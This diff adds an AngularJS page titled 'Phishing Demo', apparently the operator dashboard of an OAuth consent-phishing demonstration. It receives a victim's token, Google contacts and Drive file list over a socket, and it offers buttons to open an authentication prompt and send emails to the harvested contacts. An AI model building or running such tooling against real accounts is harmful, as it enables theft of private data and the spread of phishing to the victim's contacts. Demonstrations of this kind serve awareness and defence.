@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="en" ng-app="phish">
+	<head>
+		<title>Phishing Demo</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+		<link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-pink.min.css">
+		<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Roboto:300,400,500,700" type="text/css">
+	</head>
+	<body>
+		<main ng-controller="MainCtrl">
+			<div class="mdl-grid">
+				<div class="mdl-cell mdl-cell--4-col">
+					<h3>Phishing Demo</h3>
+					
+					<button class="mdl-button mdl-js-button mdl-button--raised mdl-button--colored" ng-click="sendEmail()">
+						Send email
+					</button>
+					
+					<button class="mdl-button mdl-js-button mdl-button--raised mdl-button--colored" ng-click="openAuth()">
+						Open authentication prompt
+					</button>
+				</div>
+				
+				<div class="mdl-cell mdl-cell--4-col">
+					<h5>Contacts</h5>
+					
+					<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="checkbox-1">
+						<input type="checkbox" id="checkbox-1" class="mdl-checkbox__input" ng-model="showNonEmails">
+						<span class="mdl-checkbox__label">Show contacts without an email address</span>
+					</label>
+					
+					<ul class="mdl-list">
+						<li
+							class="md-list__item mdl-list__item--two-line"
+							ng-repeat="contact in contacts | orderBy: 'names[0].displayName'"
+							ng-hide="!showNonEmails && !contact.emailAddresses">
+							
+							<span class="mdl-list__item-primary-content">
+								<span>{{contact.names[0].displayName}}</span>
+								<span class="mdl-list__item-sub-title">{{contact.phoneNumbers[0].value}} <a ng-click="sendEmail(user, contact)">{{contact.emailAddresses[0].value}}</a></span>
+							</span>
+						</li>
+					</ul>
+				</div>
+				
+				<div class="mdl-cell mdl-cell--4-col">
+					<h5>Drive Files</h5>
+					
+					<ul class="mdl-list">
+						<li
+							class="md-list__item mdl-list__item--two-line"
+							ng-repeat="file in drive">
+							
+							<span class="mdl-list__item-primary-content">
+								<a ng-href="{{file.webViewLink}}" target="_blank">{{file.name}}</a>
+								<span class="mdl-list__item-sub-title">{{file.id}}</span>
+							</span>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</main>
+		
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.4/socket.io.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.5/angular.js"></script>
+		<script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
+
+		<script>
+			/* global angular, io */
+			const app = angular.module('phish', []);
+			
+			app.controller('MainCtrl', ['$scope', function($scope) {
+				const socket = io.connect();
+
+				$scope.token = null;
+
+				socket.on('token', token => {
+					$scope.token = token;
+					$scope.$apply();
+				});
+				
+				socket.on('contacts', data => {
+					if (data) {
+						$scope.contacts = data.connections;
+						$scope.$apply();
+					}
+				});
+				
+				socket.on('drive', data => {
+					if (data) {
+						$scope.drive = data.files;
+						$scope.$apply();
+					}
+				});
+
+				$scope.sendEmail = recipient => {
+					socket.emit('sendEmail', {recipient});
+				};
+				
+				$scope.openAuth = () => {
+					window.open('/auth', '_blank').focus();
+				};
+			}]);
+		</script>
+	</body>
+</html>
